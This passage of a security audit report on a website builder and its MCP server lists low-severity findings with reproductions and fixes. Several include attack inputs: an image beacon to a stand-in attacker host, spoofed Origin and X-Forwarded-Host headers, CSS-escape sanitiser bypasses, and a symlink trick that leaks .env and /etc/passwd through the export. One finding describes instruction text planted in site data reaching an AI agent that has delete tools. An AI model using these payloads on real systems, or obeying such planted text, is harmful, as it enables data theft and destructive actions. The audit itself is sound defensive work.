Fix: rewrite `cssFunctionCalls()` with an explicit work stack or a depth cap; wrap the walk in
`try/catch` returning the existing safe fallback; a byte cap on `customCss` at PATCH and import.

#### NVX-020 — The exported form GET-navigates a visitor's answers into the URL

Where: `src/lib/static-export.ts:116-127` (`prepareExportedPage` strips scripts and leaves the form
enabled); `src/components/blocks/Form.tsx:83` (no `action`/`method`). Contexts: S. Reproduced in
Chromium: submitting the exported contact form navigated to
`contact.html?field-0=Alice&field-1=alice%40example.org&field-2=my+medical+question`, which the
static host logged.

The export's `README.txt` warns the operator that forms have nowhere to send answers. The visitor
gets no feedback, and their input lands in the host's access log and browser history, while the
generated Datenschutzerklärung for the default `formFate` says "Eingaben verlassen Ihren Browser
nicht" (NVX-040). Referrer leakage to third parties is limited by the default referrer policy.

Fix: in `prepareExportedPage`, add `onsubmit="return false"` to every form (an inline attribute
survives the script strip and the export has no CSP) and disable the submit button, or wrap the
fields in `<fieldset disabled>` with a visible note; inject a `<meta name="referrer">`; reword the
legal text.

#### NVX-021 — The privacy audit ignores rich-text blocks, so the notice can assert "no third-party content" while trackers load

Where: `src/lib/legal/audit.ts:153` (only `html` blocks and media `src` props are scanned).
Contexts: M, import, paste, then the customer's legal exposure. Reproduced: a tracker `<img>` in a
Text block rendered on every page view while `GET /api/sites/[id]/legal` did not list its host.

Text, heading, list, quote, button and form-label props render through the HTML sanitiser, which
allows `img`, `video`, `source`, `iframe` and `style`, so a remote resource there loads for every
visitor and never reaches the audit; on an otherwise self-contained site the notice then says
nothing is loaded from third parties and no § 25 TDDDG consent is needed.

Fix: scan every string prop with `hostsInHtml()` (better: audit the sanitised HTML the renderer
produces, parsed with `htmlparser2`, which is already a dependency). About 30 lines plus tests.

#### NVX-045 — Sanitised content can carry any `id`, and `id="__next_f"` breaks React hydration on the page and the builder's editor

Where: `src/lib/sanitize.ts:35` (`"*": ["class", "id", "style"]`). Contexts: M, import, paste on
the published page and the editor. Reproduced in Chromium: raised from low to medium by the
verifier.

Sanitised content is server-rendered before Next's bootstrap script, so an element named
`__next_f` wins over `self.__next_f = self.__next_f || []`, every push throws, and React never
hydrates. On the published page that kills every client component (forms, menus). On the editor
page for that site the whole builder UI is inert (28 buttons in the HTML, zero React fibers), so an
owner who accepted an MCP-written or imported footer or HTML block can no longer repair the site
through the UI; recovery needs the API or the database.

Fix: prefix every `id` in a `transformTags['*']` hook (`c-` plus the sanitised value) and apply the
same prefix to `href="#…"` anchors; or drop `id` from the wildcard list. About an hour.

#### NVX-022 — The launcher, the scripts and the MCP configs run `prisma`, `tsx` and `next` through `npx`, while several of those are dev dependencies

Where: `scripts/first-run.js:152` (`capture("npx", ["prisma", "db", "push"])` with stdin ignored),
`scripts/db-reset.js:82-83`, `electron/server.js:90`, `setup-mcp.sh:51-52`, `opencode.json:6`,
`INSTALL.md:299-300` (no `cwd`); `package.json` lists `prisma`, `tsx`, `tailwindcss` and
`autoprefixer` under `devDependencies`, and `src/lib/export-css.ts` imports the last two at request
time. Contexts: every install; especially M. Reproduced: from a `cwd` outside the repository, as the
manual MCP snippet does it, `npx tsx` downloaded and executed `tsx` from the registry with only an
`npm warn` line.

When the local binary is not found, `npx` installs the latest version from the registry without a
prompt (stdin is not a TTY). For `prisma` that is a release candidate two majors ahead, run with
`db push` against the only database. A `NODE_ENV=production` install is partly self-blocking (the
`postinstall` hook fails loudly), but a user who ignores the error still gets the registry fetch;
the realistic trigger is the MCP configuration without a `cwd`.

Fix: move the four packages to `dependencies`; replace `npx <bin>` with `process.execPath` plus
`require.resolve(...)` from the repository root, failing with "run npm install" when resolution
fails; have `setup-mcp.sh` and the docs emit a `node <repo>/node_modules/...` command with an
explicit `cwd`.

#### NVX-S001 — The public page's RSC payload serialises the whole Site row and every page's content to visitors

Where: `src/app/(published)/sites/[siteSlug]/[[...pageSlug]]/page.tsx:45-48` (loads the full row
with `include: { pages }`), `:82` and `:86` (passes it to client components in
`src/components/public/SiteChrome.tsx`, which is `"use client"`). Contexts: N, P. Reproduced.
Found by the completeness sweep.

React Flight serialises the runtime object, not the TypeScript prop type, and React 18 does not
dedupe plain objects, so every published page carries, inside `self.__next_f.push(...)`, the raw
`legal` profile (including fields typed at any wizard step for a site that never generated a legal
page: a DPO's private street address, representatives, notes), the unsanitised source of
`customCss`, `headerHtml` and `footerHtml`, and every published page's full content, twice. The
flight encoding escapes `<`, so the stripped markup is readable but inert.

Fix: `select` only the columns the renderer needs and pass small DTOs to `SiteHeader`,
`SiteFooter` and the nav (name, slug, accent, header settings, page slug/title/isHome). About an
hour; add a test that the served HTML does not contain a legal-profile field.

### Low

#### NVX-005 — Files uploaded while the production server runs return 404 until it is restarted

Where: `src/app/api/upload/route.ts:64-66`. Contexts: every production run (desktop launcher,
`npm run start`, Docker). Reproduced.

Next 14 in production snapshots `public/` once at start (`filesystem.js`, gated on
`matchedItem || opts.dev`). The upload route writes into `public/uploads` and returns
`/uploads/<name>`, so the file exists on disk, the media library lists it, and the canvas, the
published page and the OG image all get a 404 until Neuravex is quit and restarted. The e2e suite
never sees this because Playwright runs `next dev`. No attacker is involved, so it is low on the
security scale, but it is a ship-blocking functional defect in the mode customers actually run
(carried into the launch checklist). It also means the SVG findings above are only reachable on the
builder origin after a restart.

Fix: serve uploads through a route handler (`src/app/uploads/[name]/route.ts`) that allows a single
path segment from the extension allowlist, resolves inside the upload directory, streams the file
with a content type taken from the extension (never sniffed), `X-Content-Type-Options: nosniff`, and
`Content-Disposition: attachment` for non-image types. Keep the `/uploads/…` URL shape so nothing
else changes. Add a test that runs against `next build && next start`. Effort: half a day.

#### NVX-026 — The download, sitemap and robots routes take their origin from `X-Forwarded-Proto`, so behind the documented HTTPS proxy every download fails

Where: `src/app/api/sites/[id]/download/route.ts:55` (`new URL(req.url).origin`) and `:64`; the
sitemap and robots routes share the derivation. Contexts: P (deterministic), N and L (a client can
break its own request). Reproduced.

Next builds `req.url` from the listen hostname (the `Host` header is ignored, so there is no SSRF;
a forged `Host` pointing at a listener received nothing) but takes the scheme from
`X-Forwarded-Proto`. `INSTALL.md:194` sets that header to `$scheme`, so behind TLS the download
route fetches `https://localhost:3939` against its own plaintext port and dies with
`ERR_SSL_PACKET_LENGTH_TOO_LONG`, returning an unhandled 500 rather than the intended 502. The
sitemap then advertises `https://localhost:3939/…`.

Fix: render the pages in-process through a shared `renderPublishedPage()` used by both the public
route and the download, or at minimum fetch `http://127.0.0.1:${PORT}` explicitly and wrap the
fetch in `try/catch`. Take the public origin for `sitemap.xml` and `robots.txt` from a configured
`PUBLIC_URL`. Add an e2e case that sends `X-Forwarded-Proto: https`. Effort: 1 to 2 hours for the
minimal patch, about a day for the shared renderer.

#### NVX-027 — Site import skips the field validation the settings API applies

Where: `src/lib/site-archive.ts:132` (`siteCreateData` copies every field verbatim). Contexts: an
attacker-supplied archive. Reproduced.

`PATCH /api/sites/[id]` allowlists `headerShape` and `headerPosition`, regex-checks `language` and
clamps `headerOpacity`; import does none of that, so an archive stores `headerShape: "<b>x"`,
`language: '"><script>'` and `headerOpacity: 999`. Rendering absorbs all of it today (React
escapes `lang`, the switch statements fall through to defaults, `siteThemeCss` rejects non-hex), so
this is a trust-boundary hygiene item rather than a bypass. Note that `favicon` and `ogImage` are
not validated on either path, and both become off-origin fetches on every page load; that is
by design for the settings UI but worth a scheme check.

Fix: extract the PATCH validators into `src/lib/site-fields.ts` (`normalizeSiteFields()`) and call it
from the PATCH route, `siteCreateData()`, trash restore and MCP `create_site`; add an
`http(s)://`-or-relative check for `favicon` and `ogImage`. Effort: 2 to 3 hours.

#### NVX-028 — The documented Node.js minimum is end-of-life and cannot run the test suite

Where: `README.md:5` and `:44` ("Node 18+"), `INSTALL.md:27` ("18.0+"); no `engines` field, no
`.nvmrc`. Contexts: every install.

Node 18 reached end of life in April 2025. `vitest` 4 and `@playwright/test` 1.62 refuse Node
below 20, and `next` 14.2 refuses below 18.17, so the documented minimum cannot run `npm test` and
`18.0` cannot even start the app. The builder and the stdio MCP server would run on 18.17, so this
is documentation steering operators onto an unpatched runtime rather than a product break.

Fix: `"engines": { "node": ">=20" }`, an `.nvmrc` with `20`, `engine-strict=true` in `.npmrc`,
and "Node.js 20 LTS or newer" in both documents; let CI read `.nvmrc`. Effort: 30 minutes.

#### NVX-029 — The Playwright suite, including the only test of the CSRF defence, never runs in CI

Where: `.github/workflows/ci.yml:32` (only `npm test`), `playwright.config.ts:19` (`next dev`).
Contexts: process. Reproduced (the check works today; nothing guards it).

No unit test references `src/middleware.ts`; the cross-site refusal is asserted only in
`e2e/request-origin.spec.ts`, which CI does not execute. The suite also runs against the dev server,
whose CSP carries `unsafe-eval` and `ws:`, so nothing ever asserts the production policy. A refactor
of the middleware could land green.

Fix: add `src/middleware.test.ts` (foreign origin refused, matching origin and no origin allowed,
production CSP has no `unsafe-eval`; note a hand-built `NextRequest` needs an explicit `host`
header), and a CI job that installs Chromium, builds, and runs the e2e suite against `next start`.
Effort: half a day, mostly CI tuning.

#### NVX-030 — The web app's SQLite PRAGMAs are never executed

Where: `src/lib/prisma.ts:13-15`. Contexts: every install that has not run the MCP server.
Reproduced.

The three `$queryRawUnsafe` calls inside `.then()` are neither awaited nor chained, and a Prisma
query is a lazy promise that only runs when something waits on it, so `journal_mode=WAL` is never
set by the web app (a fresh database stayed in `delete` mode on every run; awaiting the same call
flipped it). The comments in this file, in `mcp-server.ts:28-30` and the test at
`src/lib/mcp-server.test.ts:60` describe behaviour that does not exist. The impact is narrower than
the comments suggest: Prisma's SQLite driver already defaults `busy_timeout` to 5000 and
`foreign_keys` on, and WAL is persistent in the file, so any database the MCP server (which awaits
its PRAGMAs) has touched once stays in WAL. A web-only install loses WAL's reader/writer
independence; a write transaction longer than five seconds then surfaces as a 500 (see the
operations items in the checklist).

Fix: make the setup awaited and gate queries on it (`const ready = client.$connect().then(async
() => { await …; await …; await …; })` and a `$extends` hook that awaits `ready`), or set WAL once
at install time in `scripts/first-run.js` since it persists. Add a test that opens a fresh file
through the module and asserts `journal_mode` is `wal`. Effort: about an hour.

#### NVX-031 — Stopping the launcher can leave the server running on every interface

Where: `electron/server.js:105` (`proc.kill("SIGTERM")` on a `shell: true` child), `:90`, `:106`.
Contexts: L and N. Reproduced.

The child is `sh -c npx next start …`, four processes deep. A signal delivered to the launcher's
PID alone (`kill`, a supervisor, a GUI wrapper, Windows `proc.kill()` through `cmd.exe`) ends the
shell and orphans `next-server`, which keeps the port bound with no window telling the owner.
A terminal Ctrl-C is fine on macOS and Linux because it signals the whole foreground group, so the
finding's original "quit with Ctrl-C" scenario does not hold there.

Fix: spawn the Next CLI directly without a shell (`spawn(process.execPath,
[require.resolve('next/dist/bin/next'), 'start', …], { detached: process.platform !== 'win32' })`),
kill the process group on POSIX and `taskkill /pid <pid> /T /F` on Windows, and wait for the child's
exit (with a SIGKILL fallback) before `process.exit`. Effort: 1 to 2 hours plus a manual Windows
check.

#### NVX-033 — The CSP does not back the sanitisers for styles and images

Where: `src/middleware.ts:63-65` (`style-src 'unsafe-inline'`, `img-src https:`,
`font-src https:`); no `report-uri`. Contexts: L, N, P. Reproduced.

Script exfiltration is contained (nonce, `strict-dynamic`, `connect-src 'self'`,
`form-action 'self'`), but inline styles and image loads from any HTTPS origin are allowed, so
whenever a sanitiser lets a `style` attribute or `<img>` through (NVX-006 today) the policy permits
the beacon and logs nothing. The verifiers narrowed the original claim: `<style>` elements are
discarded and `sanitizeCss()` strips `url()`, so attribute-selector exfiltration is not currently
reachable from any content source; what remains is a fixed per-view beacon, equivalent to the remote
`<img>` the product allows by design. `font-src https:` is not reachable at all through content.
This is the missing second layer, not a channel of its own.

Fix: split styles into `style-src-elem 'self' 'nonce-…'` plus `style-src-attr 'unsafe-inline'`
(keeping `style-src` as the fallback), put the nonce on the app's own `<style>` elements (the
public page and the editor's three), and add `report-uri /api/csp-report` with a small POST handler
that logs one line per violation. Effort: half a day.

#### NVX-035 — `sanitize-html` 2.17.5 carries two open advisories that the current allowlists do not reach

Where: `src/lib/sanitize.ts:15` and `src/lib/security.ts:269-281`. Contexts: none today.
Reproduced (both proof-of-concept payloads come back neutralised).

GHSA-jxwj-j7wr-gfrw (mutation XSS through `</textarea/>`, fixed 2.17.6) needs `textarea` or
`xmp` in the allowlist; GHSA-g8qq-57p8-ggw5 (SMIL `values` URI bypass, fixed 2.17.7) needs
`animate` or `set`. Neither list includes them, so the sanitiser is not exposed. The fix is one patch
bump, and the only risk is a future edit that widens an allowlist.

Fix: `npm i sanitize-html@^2.17.7` and two unit tests pinning the payloads. Effort: under an hour.

#### NVX-036 — The reverse-proxy recipe in `INSTALL.md` leaves the builder open

Where: `INSTALL.md:181-199`. Contexts: P.

The checklist three lines above says to add your own access control; the copy-paste nginx block has
TLS and nothing else: no `auth_basic` or `allow`/`deny`, no `Strict-Transport-Security`, no port-80
redirect, no `proxy_set_header X-Forwarded-Host` (so a client-supplied one is forwarded, see
NVX-034). It also never explains that `auth_basic` on `location /` locks
visitors out of every published site and breaks the visitor form, which is what pushes an operator
into exempting `/api/` wholesale and re-exposing the admin API.

Fix: rewrite the example so the pasted block is safe on its own: port-80 redirect, HSTS,
`proxy_set_header X-Forwarded-Host $host`, `auth_basic` at server level, then `location /sites/`
and `location = /api/submissions` (POST only) with `auth_basic off`, plus a paragraph explaining
the split and warning against exempting `/api/`. Add `proxy_read_timeout` for the download route.
Effort: 1 to 2 hours.

#### NVX-037 — The backup advice names one file, and a live copy of it is inconsistent

Where: `INSTALL.md:175`. Contexts: every install. Reproduced.

"Back up `prisma/dev.db`" is the whole story. Once the database is in WAL mode (which the MCP server
sets and NVX-030's fix will set everywhere), committed rows sit in `dev.db-wal` until a checkpoint;
a plain copy of `dev.db` taken while the app runs was missing the most recently created site. Every
image on every page lives in `public/uploads`, which the advice never mentions, and the JSON export
carries image URLs but never the files. (The Docker example does mount both volumes; the doc line
does not.)

Fix: tell operators to quit the app first or use `sqlite3 prisma/dev.db ".backup …"` /
`VACUUM INTO`, and to copy `public/uploads` alongside; optionally an `npm run backup` script and a
`wal_checkpoint(TRUNCATE)` on shutdown. Effort: 30 minutes for the text.

#### NVX-038 — Port and capability drift between the docs, the MCP server and the launcher

Where: `mcp-server.ts:473` (`PUBLIC_URL || "http://localhost:3000"`), `electron/server.js:18` (port
3939), `INSTALL.md:313-324` (MCP tool table), `README.md:107` ("DOMPurify"). Contexts: M and
documentation. Reproduced over stdio.

`get_site_url` hands the agent `http://localhost:3000/sites/…`, which is connection-refused under
the documented launcher. `INSTALL.md` lists nine MCP tools, two of which (`update_site`,
`update_page`) do not exist, and omits nine that do, among them `publish_page` and
`generate_legal_pages`, the two that take agent-written content live and rewrite the Impressum. An
operator reading that table under-estimates what a prompt-injected agent can do. The README names
a sanitiser library the code does not use.

Fix: default the URL to `http://localhost:${PORT || 3939}` and document `PUBLIC_URL`; regenerate
the table from the sixteen `server.tool(` registrations and add a test that fails when the table
drifts; fix the README lines. Effort: 1 to 2 hours.

#### NVX-039 — No disclosure channel, supported-versions statement, changelog or filled-in licence

Where: `package.json:3` (version duplicated in `electron/server.js:74` and `mcp-server.ts:74`),
`LICENSE:189` (`Copyright [yyyy] [name of copyright owner]`), no `SECURITY.md`, no `CHANGELOG.md`,
no git tag. Contexts: process.

A researcher who finds a sanitiser gap has no private channel, and an operator cannot tell whether
their copy includes the fixes from commits `42e842f` and `6e2b7e9`.

Fix: add `SECURITY.md` (private contact, scope, the "no auth by design" statement, supported
versions), seed `CHANGELOG.md` and tag `v0.1.0`, read the version from `package.json` in both
places, fill in the licence owner and add `"license": "Apache-2.0"`. Effort: about 2 hours.

#### NVX-040 — The legal-page defaults make affirmative claims the operator never confirmed

Where: `src/lib/legal/profile.ts:194` (`hostingDpa` defaults to `true`), `:198` (`formFate`
defaults to `"none"`), `:327-333` (`missingFor()` never asks for either). Contexts: the customer's
legal exposure. Reproduced end to end.

With only the required fields filled in, the generated Datenschutzerklärung states that an
Art. 28 DPA with the host exists and that form input "verlässt Ihren Browser nicht und wird
nirgends gespeichert", while the builder-served form posts to `/api/submissions` and stores every
submission. The verifiers found the second sentence is wrong for the static export as well: the
exported `<form>` has no `action` or `method` and its script is stripped, so a submit performs a
native GET that puts every field into the URL and the host's access log (NVX-020).

Fix: make both fields tri-state with no default, have `missingFor()` require them when a host or a
form is present, emit the Art. 28 sentence only when confirmed, and replace the "stored nowhere"
sentence with text that matches how the site is actually served. Effort: about half a day.

#### NVX-062 — Custom header and footer HTML substitute the site name and page titles as markup before sanitising

Where: `src/components/public/SiteChrome.tsx:84` (nav link built by concatenation), `:87` and
`:206-208` (`String.replace` with a string replacement, so `$&`, `` $` `` and `$'` are expanded).
Contexts: published page, editor canvas and S, when the operator has set a custom header or footer
using `{nav}`, `{name}` or `{legal}`; the titles come from M or import. Reproduced.

A page renamed to `<img src="https://attacker/nav">` carries a beacon inside the nav of every page,
`</a><div class="pwned">` breaks out of the operator's anchor, and a site name containing `` $` ``
duplicated the operator's own header markup. The sanitiser runs afterwards, so no script. The MCP
server cannot set the header HTML, which keeps this low.

Fix: an `escapeHtml()` helper for every interpolated value and function replacers
(`.replace(/\{name\}/g, () => escapeHtml(site.name))`) so `$` patterns are inert; a unit test for
both. Effort: about an hour.

### Low (continued)

#### NVX-034 — `X-Forwarded-Host` from any client overrides `Host` in the Origin check

Where: `src/middleware.ts:105`. Reproduced: `Origin: http://evil.tld` alone is refused (403);
with `X-Forwarded-Host: evil.tld` added it is accepted (201). A browser cannot send that header
cross-origin without a CORS preflight the API never approves, and a raw client can already omit
`Origin`, so there is no privilege gain today. It becomes a bypass the day any mutating route
answers CORS, and the documented nginx example forwards a client-supplied value untouched.

Fix: honour `x-forwarded-host` only when `NEURAVEX_TRUST_PROXY=1`; add
`proxy_set_header X-Forwarded-Host $host;` to the example. Twenty minutes plus a test.

#### NVX-041 — A malformed percent-encoded asset reference breaks the whole download

Where: `src/lib/static-export.ts:90` (`decodeURIComponent` with no guard),
`src/app/api/sites/[id]/download/route.ts:72`. Reproduced: `<img src="/uploads/%ZZ.png">` renders
fine on the page and turns *Download* into a 500 with no hint which block is responsible.

Fix: `try/catch` around the decode (skip the reference); wrap the per-page loop and return the
existing 502 naming the page.

#### NVX-042 — `GET /api/media` rescans every page's full content on every request

Where: `src/app/api/media/route.ts:21`. Reproduced: 5 ms at baseline, 0.2 to 0.5 s with 27 MB of
page content across 68 pages. Admin latency, not an outage; the scan spans every site and page
content has no size cap.

Fix: scope the scan to one site, filter in SQL, or keep a `MediaUsage` table updated on save; cap
page content size at save and create.

#### NVX-043 — Each download re-renders every page and recompiles Tailwind with no cache

Where: `src/app/api/sites/[id]/download/route.ts:64` and `:92`. Measured: about 0.85 s of CPU per
download of a 12-page site; four concurrent downloads did not saturate the server. Amplification,
not a demonstrated outage.

Fix: cache compiled CSS and rendered pages by content hash; bound concurrent export jobs.

#### NVX-044 — The SVG `style` attribute cleaner is three regexes and is bypassed by CSS escapes and `image-set()`

Where: `src/lib/security.ts:293-298`. Reproduced: `fill:\75 rl(https://…)` and
`background:image-set(...)` pass and are fetched when the SVG is opened as a document. Impact is
small because `<image href="https://…">` is permitted by design, so the bypass adds a beacon the
file could already carry; the stale claim is the function's own comment, not the README.

Fix: delete `sanitizeSvgStyle()` and run the attribute through postcss and `declarationIsSafe()`,
extended to treat `image-set()`, `image()` and `src()` like `url()`.

#### NVX-046 — `X-Powered-By` is emitted and no cross-origin isolation headers are set

Where: `next.config.js:17`. Framework fingerprinting is trivial anyway from `/_next/static`;
without `Cross-Origin-Resource-Policy` another origin can probe whether a guessed upload exists,
though names are twelve random base-36 characters. Hardening.

Fix: `poweredByHeader: false`; `Cross-Origin-Opener-Policy: same-origin` and
`Cross-Origin-Resource-Policy: same-origin` in `headers()`; HSTS in the proxy recipe.

#### NVX-047 — The upload route throws on a non-file `file` part or a non-multipart body

Where: `src/app/api/upload/route.ts:27` and `:31`. Reproduced: three malformed requests each produce
a 500 and a stack trace in the log; nothing is written or disclosed.

Fix: `try/catch` around `formData()` and an `instanceof File` check, both returning 400.

#### NVX-048 — `data:` is an allowed link scheme and `target="_blank"` keeps no `rel`

Where: `src/lib/sanitize.ts:37-38`, `src/components/blocks/FormattingToolbar.tsx:87`
(`execCommand("createLink", href)` with no check). Reproduced: a `data:application/octet-stream`
link on the published and exported page produced a download on click with no prompt; a
`data:text/html` navigation was blocked by Chromium. Current browsers imply `noopener`.

Fix: `allowedSchemesByTag` so `data:` is allowed on `img` only; force `rel="noopener noreferrer"`
on `_blank` anchors; reject unsupported schemes in the toolbar.

#### NVX-049 — Type-confused import and POST fields reach Prisma and answer 500; duplicate slugs in one archive are not resolved

Where: `src/lib/site-archive.ts:130-137` and `:167-169` (bare casts),
`src/app/api/sites/import/route.ts:17-23`, `src/app/api/sites/[id]/pages/route.ts:24`,
`src/app/api/submissions/route.ts:10-14`. Reproduced: five malformed inputs, all 500 with an empty
body. No leak; `findUnique` rejects an object id rather than treating it as a filter, so the
IDOR-pattern remark from the raw finding does not apply to any current route.

Fix: zod schemas for the archive at the boundary; a slug de-duplication pass on import;
`typeof` checks before `slugify` and before the submissions lookup.

#### NVX-050 — The database and its WAL are created world-readable

Where: created under the default `022` umask; `prisma/schema.prisma:134` (`Submission`, visitor
data). Only matters on a multi-user host (another local account). `.env` holds no secret and
uploads are served to everyone anyway.

Fix: `chmod 0600` the database and sidecars after connect, `process.umask(0o077)` in the launcher;
one line in the production checklist about a dedicated user.

#### NVX-051 — Exported and proxied pages carry the builder's `localhost` origin in `og:image`

Where: `src/app/(published)/sites/[siteSlug]/[[...pageSlug]]/page.tsx:38` (no `metadataBase`, so
Next falls back to `http://localhost:<port>`); `src/lib/static-export.ts:83` (the asset regex
needs a quote before `/uploads`, so the absolute URL is neither rewritten nor bundled). Reproduced:
the exported page advertises `http://localhost:3939/uploads/…`, the file is not in the archive, and
a proxied instance advertises its internal port regardless of `Host`.

Fix: compute `metadataBase` from a `PUBLIC_URL` or the forwarded headers; rewrite the absolute
form to relative before asset collection.

#### NVX-052 — Behind a shared proxy credential every user is an administrator of every site, nothing is logged, and the trash silently drops the 51st item

Where: `src/lib/trash.ts:27` (`TRASH_LIMIT = 50`), `:30-38`, `:139-143` (a restored site gets a new
id, so trashed pages of a deleted site can never be restored). No `console.*` call exists under
`src/app/api`, so nothing is attributable. Documentation and threat-model gap in context P.

Fix: say in the production checklist that the instance is single-tenant and the proxy's access
log is the only audit trail; if multi-user becomes a goal, a small mutation log, a byte-based trash
cap, and re-pointing trashed pages on site restore.

#### NVX-053 — `setup-mcp.sh` overwrites a user's MCP config without backup, and a stale absolute `DATABASE_URL` silently creates an empty database

Where: `setup-mcp.sh:43` (`mkdir -p` unconditionally), `:47` (`cat >`); `INSTALL.md:289` names
clients the script does not handle; the manual snippet has no `cwd`. Reproduced: a stale path
produced a zero-byte file and "The table `main.Site` does not exist", which an agent cannot tell
from an empty install.

Fix: skip the block unless the directory exists, back up and merge JSON, fix the docs, and have
`mcp-server.ts` refuse to start when the database file is missing or has no tables.

#### NVX-054 — The exporter, the media library and Next's static serving follow symlinks placed in `public/uploads`

Where: `src/app/api/sites/[id]/download/route.ts:86` (no realpath containment),
`src/app/api/media/route.ts:44` (`readdir` lists links). Reproduced: `ln -s .env public/uploads/link.png`
appeared in the library and its contents landed in the zip immediately; a linked `/etc` exposed
`passwd`; after a restart the link was served as `image/png`. No route creates symlinks, so the
precondition is write access to the directory (a shared volume, an untrusted backup restore).

Fix: `realpath` containment and an `lstat().isFile()` check in the exporter; `readdir` with
`withFileTypes` keeping regular files only.

#### NVX-055 — Telemetry is not fully off: Prisma's checkpoint ping is never disabled, and the plain npm scripts leave Next telemetry on

Where: `electron/server.js:96` and `scripts/first-run.js:63,75` set only `NEXT_TELEMETRY_DISABLED`;
`CHECKPOINT_DISABLE` appears nowhere; `npx next telemetry status` reports enabled for
`npm run dev|build|lint`. The Prisma ping fires on first install and after schema changes, not on
every start. The README scopes "nothing phoning home" to the built sites; the launcher's own comment
is the stronger promise.

Fix: add `CHECKPOINT_DISABLE=1` beside the Next variable in the launcher and scripts; prefix the
npm scripts with both; one sentence about offline installs needing `PRISMA_ENGINES_MIRROR`.

#### NVX-056 — The custom-HTML audit regex matches only quoted attribute values

Where: `src/lib/legal/audit.ts:87`. Reproduced: `<img src=https://unquoted.example/p.gif>` is
normalised and rendered by the sanitiser but invisible to the audit; `srcset` is not scanned
despite the comment.

Fix: parse the fragment with `htmlparser2` and collect `src`, `srcset` candidates, `link href`,
`action`, `poster` and `url()` in styles (shared with NVX-021).

#### NVX-057 — Plain hyperlinks are reported as third-party content that sends the visitor's IP on page load

Where: `src/lib/legal/audit.ts:87` (`href` treated like `src`). Reproduced: a footer link to
`instagram.com` produced a "chrome-remote" finding, `selfContained: false`, and a
Datenschutzerklärung paragraph (`datenschutz.ts:221-224`) stating that the visitor's IP is
transmitted on page load. The notice over-declares processing; the opposite failure from NVX-021.

Fix: count `href` only on `<link>` (and SVG `use`/`image`); collect anchors into a separate
`links` list shown in the legal panel without feeding `remoteHosts`.

#### NVX-058 — Form submissions cannot be deleted, exported or listed in full

Where: `src/app/api/pages/[id]/submissions/route.ts:11` (`take: 100`, no paging); no delete route
anywhere; page or site deletion moves the submissions into the trash payload rather than erasing
them. The generated notice promises Art. 17 erasure and prints a retention period the product
cannot enforce.

Fix: `DELETE /api/submissions/[id]` and a "delete older than" route, pagination and a count,
per-card delete and JSON/CSV export in the viewer, an optional retention sweep; document that
trashed pages keep submissions.

#### NVX-059 — Uploaded photographs keep their EXIF metadata, including GPS

Where: `src/app/api/upload/route.ts:66` (bytes written unchanged),
`src/app/api/sites/[id]/download/route.ts:86` (copied raw into the zip). Reproduced: a JPEG with a
GPS IFD and an `Artist` tag came through the upload and the export byte-identical. The bundled
stock photographs are clean (0 of 74 carry an APP1 segment). No dependency can strip metadata and
nothing warns the operator.

Fix: a small hand-rolled `stripImageMetadata()` in the style of `image-size.ts`: for JPEG drop APP1,
APP13 and COM segments before SOS (keep orientation or re-emit a minimal APP1); for PNG drop
`eXIf`, `tEXt`, `iTXt`, `zTXt`; for WebP drop the `EXIF` and `XMP` chunks; leave others untouched.

#### NVX-060 — The CI workflow has no supply-chain hardening

Where: `.github/workflows/ci.yml:15,17` (mutable `@v4` tags), no `permissions:` block, no audit,
dependency review, CodeQL or update bot. The original "push to main" outcome is not established:
the repository was created in 2026, so the default `GITHUB_TOKEN` is read-only and the workflow
uses no secrets; the realistic impact of a hijacked action is exfiltrating that token or poisoning
one run's build output.

Fix: `permissions: contents: read`, SHA pins with a version comment, an audit step (with an
exception list until the dependency work lands), `dependabot.yml` for npm and actions, optionally
the CodeQL starter workflow.

#### NVX-061 — Uploads are validated by extension and size only; the bytes are stored unchanged

Where: `src/lib/security.ts:245-253`, `src/app/api/upload/route.ts:66`. Reproduced: HTML stored as
`.gif`, `.pdf`, `.ico`, `.woff`, `.mp4`, `.avif`, `.ttf`, `.wav` and `.ogg` was served with the
extension's MIME type, `nosniff` and the CSP, and Chromium rendered none of it as a document. The
verifiers narrowed the raw finding: a static host that sends a `Content-Type` by extension will not
sniff an image type up to HTML either, and HTML under `.pdf` does not parse as a PDF. What remains
is that a picker's `accept="image/*"` is the only content check and `imageSize()` never rejects.

Fix: a `matchesType(ext, bytes)` magic-byte check per allowed extension (400 on mismatch), and
`Content-Disposition: attachment` for non-image types once uploads are served by a route
(NVX-005).

#### NVX-S002 — Site import stores page slugs, `isHome` and `legalKind` verbatim, unlike every other writer

Where: `src/lib/site-archive.ts:163` (`slug: String(page.slug ?? "page")`), `:166`, `:174`;
`src/app/api/sites/import/route.ts:21` (no cross-page check). Reproduced. Found by the completeness
sweep.

Every other writer slugifies and guards `isHome` (`pages/route.ts:24`, `pages/[id]/route.ts:61`,
`mcp-server.ts`, `trash.ts:155-160`). An archive with a raw slug such as `About Us` produces a page
that is linked from the nav but unreachable at every encoding, a download that answers 502, two
home pages that both export as `index.html` and `index-2.html` holding the same page, two
impressum pages both linked in the footer, and a `{legal}` footer substitution whose `href` is
built from the raw slug, which let a slug close the attribute and add a `style` on the builder
origin. The break-out adds nothing the archive author could not already do through `footerHtml`'s
permitted `style` attribute, and the breakage is confined to the imported site, hence low.

Fix: normalise per page in `pageCreateData` (slugify, de-duplicate with the existing suffix loop,
first `isHome` only, one page per `legalKind`), and URL-encode and HTML-escape the values used in
`SiteChrome.tsx`'s footer and nav strings (shared with NVX-062).

#### NVX-S003 — MCP tool results echo stored site text with no data-versus-instruction framing

Where: `mcp-server.ts:278-282` (`get_page` returns the raw block tree), `:110-114`, `:143-145`
(`list_sites`, `get_site` return names and descriptions), `:518-561` (`get_legal_details`).
Contexts: M. Reproduced over stdio: attacker-authored instruction text placed in a site description
and a text block through an imported archive was returned verbatim to the client. Found by the
completeness sweep.

The same server registers `delete_site`, `delete_page`, `publish_page`, `save_page` and the legal
writers, and the trash keeps only 50 items, so a cascade of deletions past that is permanent.
Whether an agent follows the text depends on the model; this is defence in depth, and it is why
"anything the agent reads can instruct it" belongs in the documentation.

Fix: wrap every read result in a fixed envelope that names the content as site data, give the
delete tools a required `confirm: true` and a one-site-per-call limit, and say in `INSTALL.md`'s
MCP section that the server should not share a session with autonomous browsing or untrusted
archives.

### Info

#### NVX-064 — The postcss source-map advisories apply only to the nested copy under `next`

The runtime sanitiser resolves `postcss` 8.5.26, which is above every affected range and, as
tested, does not load a `.map` file named in a `sourceMappingURL` comment. The vulnerable 8.4.31
copy under `node_modules/next` only ever processes the repository's own `globals.css` at build time.
No change needed; the audit line clears with the Next upgrade. Optional: strip `sourceMappingURL`
comments in `sanitizeCss()` so a future downgrade cannot make the passthrough live.

